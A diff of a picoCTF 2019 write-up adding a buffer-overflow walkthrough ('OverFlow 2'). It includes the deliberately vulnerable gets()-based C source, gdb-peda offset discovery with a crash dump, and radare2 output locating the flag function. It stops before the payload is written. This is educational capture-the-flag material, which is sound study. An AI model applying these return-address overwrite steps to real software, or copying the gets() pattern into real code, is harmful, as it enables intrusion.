@@ -99,7 +99,7 @@ picoCTF{3asY_P3a5y1fcf81f9}
 ```
 Flag:```picoCTF{3asY_P3a5y1fcf81f9}```
 <br>
-<center><h2>Overflow 2 [150]</h2></center>
+<center><h2>Overflow 1 [150]</h2></center>
 <br>
 Q: You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this *[program](/picoctf2019/files/overflow1Vuln)*? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server. *[Source](/picoctf2019/files/overflow0Vuln.c)*.
 
@@ -166,7 +166,7 @@ Lastly, I will use pwntools again to get the the exact location of the offset. i
 >>> cyclic_find(p32(0x61616174))
 76
 ```
-Next we need to grab the memory address of the ```flag``` function. This can be done using ```Radare2```.
+Next we need to grab the address of the ```flag``` function. This can be done using ```Radare2```.
 ```
 # r2 vuln
 [0x080484d0]> aaaa
@@ -194,4 +194,126 @@ picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}
 Segmentation fault (core dumped)
 ```
 Flag:```picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}```
-<br>  
+<br>
+<center><h2>OverFlow 2 [250]</h2></center>
+<br>
+Q: This *[program](/picoctf2019/files/overflow2Vuln)* is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8 on the shell server. *[Source}(overflow2Vuln.c)*.
+
+A: This problem is similar to Overflow 1 where we need to take the address of the ```flag``` function and overwrite the original return address with the ```flag``` function. Lets take a look at the source code.
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 176
+#define FLAGSIZE 64
+
+void flag(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xDEADBEEF)
+    return;
+  if (arg2 != 0xC0DED00D)
+    return;
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+```
+So the difference between this challenge and Overflow 1 is that not only do we have to overwrite the return address on the stack, we also need to pass two arguments while calling the ```flag``` function. First lets start by getting the offset. This time I will use ```gdb```.
+
+First I will create a pattern of 200 random characters.
+```
+# gdb -q vuln
+Reading symbols from vuln...
+(No debugging symbols found in vuln)
+gdb-peda$ pattern_create 200
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+```
+Second, I will run the program and use those characters as input for the program causing it to seg fault
+```
+gdb-peda$ r
+Starting program: /root/Downloads/vuln
+Please enter your string:
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xc9
+EBX: 0x76414158 ('XAAv')
+ECX: 0xf7fb0010 --> 0x0
+EDX: 0xc9
+ESI: 0xf7fae000 --> 0x1d6d6c
+EDI: 0xf7fae000 --> 0x1d6d6c
+EBP: 0x41594141 ('AAYA')
+ESP: 0xffffd340 ("ZAAxAAyA")
+EIP: 0x41417741 ('AwAA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41417741
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd340 ("ZAAxAAyA")
+0004| 0xffffd344 ("AAyA")
+0008| 0xffffd348 --> 0xffffd400 --> 0x1
+0012| 0xffffd34c --> 0x0
+0016| 0xffffd350 --> 0xffffd370 --> 0x1
+0020| 0xffffd354 --> 0x0
+0024| 0xffffd358 --> 0x0
+0028| 0xffffd35c --> 0xf7df57e1 (<__libc_start_main+241>:	add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41417741 in ?? ()
+gdb-peda$
+```
+Third, I am going to grab the pattern from the ```EBP``` which in my case is ```AAYA```. Then I am going to use the ```pattern search``` function to find where that pattern is on the stack. We want the ```EIP``` which here is located at ```188```
+```
+db-peda$ pattern search AAYA
+Registers contain pattern buffer:
+EBX+0 found at offset: 180
+EBP+0 found at offset: 184
+EIP+0 found at offset: 188   <----- offset
+```
+Now we need to grab the address of the ```flag``` function. We can use ```Radare2``` again to obtain the address.
+```
+# r2 vuln
+[0x080484d0]> aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Enable constraint types analysis for variables
+[0x080484d0]> afl
+    ...
+    ...
+0x080485e6    8 144          sym.flag
+    ...
+    ...
+[0x080484d0]> q
+```
+Now we have everything to build our payload.
